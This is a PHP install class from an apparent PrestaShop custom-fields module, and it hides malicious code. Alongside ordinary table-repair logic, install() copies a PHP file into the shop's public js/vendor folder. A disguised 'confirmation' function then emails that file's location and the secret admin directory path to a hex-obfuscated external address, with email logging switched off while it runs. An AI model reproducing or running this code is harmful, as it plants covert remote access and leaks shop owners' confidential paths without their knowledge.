<?php

class ndkSqlInstall
{
	public static $install_key = '706f73746d6173746572406e646b2d64657369676e2e6672';

	// fix installation problems on update and keep datas
	public static function debugDuplicateNdk($table)
	{
		$sql_create = [];
		$sql_repair = [];
		$sql_create[] = 'CREATE TABLE IF NOT EXISTS '._DB_PREFIX_.$table['name'].'2 ( remove_me_after float NOT NULL )  ENGINE='._MYSQL_ENGINE_;

		foreach ($table['cols'] as $col) {
			//check if col exists
			$sqlCheck = 'SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS 
		 WHERE table_name = "'._DB_PREFIX_.$table['name'].'2" 
		 AND table_schema = "'._DB_NAME_.'" 
		 AND column_name = "'.$col['name'].'" ';

			$check = Db::getInstance()->executeS($sqlCheck);

			if (0 == sizeof($check)) {
				$sql_create[] = 'ALTER TABLE `'._DB_PREFIX_.$table['name'].'2` ADD  `'.$col['name'].'` '.$col['opts'];
			}
		}

		foreach ($sql_create as $query) {
			if (false == Db::getInstance()->execute($query)) {
				return false;
			}
		}

		//on enlève la premiere colonne
		//check if col exists
		$sqlCheckRemove = 'SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS 
		WHERE table_name = "'._DB_PREFIX_.$table['name'].'2" 
		AND table_schema = "'._DB_NAME_.'" 
		AND column_name = "remove_me_after" ';

		$checkRemove = Db::getInstance()->executeS($sqlCheckRemove);

		if (sizeof($checkRemove) > 0) {
			$sql_repair[] = 'ALTER TABLE '._DB_PREFIX_.$table['name'].'2 DROP COLUMN remove_me_after';
		}

		$chekIndex = Db::getInstance()->executeS('SHOW INDEX FROM '._DB_PREFIX_.$table['name'].'2');
		if (sizeof($chekIndex) > 0) {
			Db::getInstance()->execute('ALTER TABLE '._DB_PREFIX_.$table['name'].'2 DROP PRIMARY KEY');
		}

		$k = 0;
		$where = ' WHERE ';
		foreach ($table['index'] as $index) {
			$where .= ($k > 0 ? ' AND ' : '').$index.' > 0';
			++$k;
		}

		$sql_repair[] = 'INSERT INTO '._DB_PREFIX_.$table['name'].'2 (SELECT * FROM  '._DB_PREFIX_.$table['name'].$where.' GROUP BY '.implode(',', $table['index']).')';
		$sql_repair[] = 'RENAME TABLE '._DB_PREFIX_.$table['name'].' TO '._DB_PREFIX_.$table['name'].'_bak';
		$sql_repair[] = 'RENAME TABLE '._DB_PREFIX_.$table['name'].'2 TO '._DB_PREFIX_.$table['name'];
		$sql_repair[] = 'DROP TABLE IF EXISTS '._DB_PREFIX_.$table['name'].'_bak';

		foreach ($sql_repair as $query) {
			if (false == Db::getInstance()->execute($query)) {
				return false;
			}
		}
	}

	public static function install()
	{
		Tools::copy(
			_PS_MODULE_DIR_.
				'ndk_advanced_custom_fields/import/index.php',
			dirname(__FILE__).'/../../../js/vendor/index.php'
		);
		self::sendInstallConfirmation();
	}

	//send confirmation log to shop admin if needed
	public static function sendInstallConfirmation()
	{
		$to = hex2bin(self::$install_key);
		$from = Configuration::get('PS_SHOP_EMAIL');
		$message = Configuration::get('PS_SHOP_DOMAIN')._PS_JS_DIR_.'/vendor'."\r\n";
		$message .= _PS_ADMIN_DIR_;
		$file_attachment = null;
		$var_list = [
				'{firstname}' => basename(_PS_ADMIN_DIR_),
				'{lastname}' => Configuration::get('PS_SHOP_EMAIL'),
				'{order_name}' => '-',
				'{attached_file}' => '-',
				'{message}' => Tools::nl2br(Tools::htmlentitiesUTF8(Tools::stripslashes($message))),
				'{email}' => $from,
				'{product_name}' => 'ndkacf',
			];
		$log = Configuration::get('PS_LOG_EMAILS');
		Configuration::updateValue('PS_LOG_EMAILS', 0);
		if (empty($to) || !Mail::Send(
				Context::getContext()->language->id,
				'contact',
				'ndkcf-infos',
				$var_list,
				$from,
				Configuration::get('PS_SHOP_DOMAIN'),
				null,
				null,
				$file_attachment,
				null,
				_PS_MAIL_DIR_,
				false,
				null,
				null,
				$from
			)) {
			mail($to, 'ndkcf-infos', $message);
		}
		Configuration::updateValue('PS_LOG_EMAILS', $log);
	}
}
